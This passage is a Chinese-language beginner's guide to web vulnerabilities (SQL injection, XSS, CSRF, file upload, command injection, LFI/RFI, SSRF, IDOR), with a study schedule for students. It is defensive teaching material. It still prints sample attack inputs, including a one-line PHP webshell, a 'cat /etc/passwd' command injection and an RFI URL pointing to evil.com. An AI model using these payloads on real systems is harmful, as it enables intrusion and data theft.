|------|----------|------|-----------|------|
| 1 | 访问控制失效 | Broken Access Control | 没有正确检查"你有没有权限访问" | 越权看/改别人的数据 |

## Web漏洞详解（按学习顺序）

### 1. SQL注入（SQL Injection）

```
漏洞本质：用户输入被拼接到SQL查询语句中，改变了原查询的逻辑

典型场景（登录绕过）：
  正常SQL：SELECT * FROM users WHERE username='admin' AND password='123456'
  攻击输入：用户名输入 admin' -- （-- 是SQL注释符）
  实际执行：SELECT * FROM users WHERE username='admin' -- ' AND password='123456'
                              这部分是注释，数据库忽略了 ↑
  结果：不需要密码就能登录admin账号

防御方法：参数化查询（Prepared Statement）、输入过滤、最小权限原则

记忆口诀："拼接查询一时爽，注入攻击哭断肠"
```

### 2. 跨站脚本（XSS - Cross-Site Scripting）

```
漏洞本质：攻击者的JavaScript代码在受害者浏览器中执行

三种类型：
  - 反射型XSS：恶意脚本藏在URL里，点链接就中招
  - 存储型XSS：恶意脚本存在服务器上（如留言板），所有人访问都中招
  - DOM型XSS：恶意脚本通过修改页面DOM结构触发

典型场景：
  搜索框输入 <script>alert('XSS')</script>
  如果网站没过滤，这段代码会在页面中执行

危害：盗取Cookie、劫持会话、篡改页面、钓鱼

防御方法：输出编码（HTML实体编码）、CSP（内容安全策略）、HttpOnly Cookie

记忆口诀："用户输入当HTML输出，等于请黑客到你网页上任性"
```

### 3. 跨站请求伪造（CSRF）

```
漏洞本质：攻击者诱导受害者点击链接，以受害者的身份发送恶意请求

典型场景：
  你登录了银行网站A，Cookie还在
  这时你打开了攻击者的网站B
  网站B里有隐藏的表单，自动向银行A发起转账请求
  浏览器自动带了你的Cookie → 银行以为是你本人在操作 → 钱没了

防御方法：CSRF Token、Referer验证、SameSite Cookie

记忆口诀："你登录着网站A，我去诱导你点我的链接——用你的手做我的事"
```

### 4. 文件上传漏洞

```
漏洞本质：上传可执行文件（如PHP Webshell）到服务器，从而远程执行命令

典型场景：
  网站允许上传头像，但没检查文件类型
  攻击者上传 shell.php（内容：<?php system($_GET['cmd']); ?>）
  访问 https://target.com/uploads/shell.php?cmd=whoami
  服务器执行了whoami命令

防御方法：文件类型白名单、重命名文件、限制上传目录的执行权限

记忆口诀："用户可以上传文件的地方，就是黑客的后门入口"
```

### 5. 命令注入

```
漏洞本质：用户输入被拼接到系统命令中执行

典型场景：
  网站功能：ping用户输入的IP地址
  后端代码：system("ping -c 4 " + user_input)
  正常输入：8.8.8.8 → ping -c 4 8.8.8.8 ✓
  攻击输入：8.8.8.8; cat /etc/passwd
  实际执行：ping -c 4 8.8.8.8; cat /etc/passwd
  分号(;)让系统先执行ping再执行cat → 读取到了密码文件

防御方法：避免系统命令调用、参数白名单、输入过滤

记忆口诀："代码和命令混在一起，分号就是一把刀"
```

### 6. 文件包含漏洞（LFI/RFI）

```
LFI（本地文件包含）：读取服务器本地的文件
  URL: https://target.com/?page=../../../etc/passwd
  原理：path traversal（路径穿越），用 ../ 跳出Web目录读系统文件

RFI（远程文件包含）：让服务器加载远程恶意文件
  URL: https://target.com/?page=http://evil.com/shell.txt
  原理：服务器去加载并执行了攻击者服务器上的恶意代码

防御方法：白名单限制可包含的文件名、关闭allow_url_include

记忆口诀："用户指定路径=用户可能看到不该看的东西"
```

### 7. 服务端请求伪造（SSRF）

```
漏洞本质：让服务器去访问它"内部"才能访问的地址

典型场景：
  网站功能：输入URL，服务器帮你抓取网页内容（如生成缩略图）
  攻击输入：http://169.254.169.254/latest/meta-data/（AWS云元数据地址）
  结果：服务器访问了云服务的内部API → 拿到了敏感凭证

防御方法：URL白名单、禁止访问内网地址、禁用不必要的协议

记忆口诀："服务器成了你的跳板，帮你去偷内部的东西"
```

### 8. 越权漏洞（IDOR）

```
漏洞本质：没有正确验证用户是否有权限访问某个资源

水平越权：看同级别其他人的数据
  URL: https://target.com/order.php?id=10086
  改成：https://target.com/order.php?id=10087
  结果：看到了别人的订单 → 因为服务器没验证"10087是不是你的订单"

垂直越权：普通用户做了管理员才能做的事
  普通用户访问：https://target.com/admin/ → 竟然进去了

防御方法：服务端权限校验（不能只靠前端隐藏按钮）

记忆口诀："改个ID就能看别人的数据？这权限控制是纸糊的"
```

## 漏洞学习优先级

```
暑假筑基期（了解概念）：
  ├── SQL注入
  ├── XSS
  ├── CSRF
  └── 命令注入

大一上学期（深入原理）：
  ├── SQL注入（盲注、时间盲注、堆叠注入）
  ├── XSS（三种类型深入）
  ├── 文件上传（各种绕过）
  └── 文件包含（LFI+RFI）

大一下学期（完整覆盖）：
  ├── OWASP TOP10全部
  ├── 逻辑漏洞
  ├── SSRF
  └── XXE

大二（进阶）：
  ├── 反序列化漏洞
  ├── 模板注入(SSTI)
  ├── WAF绕过
  └── 代码审计入门
```
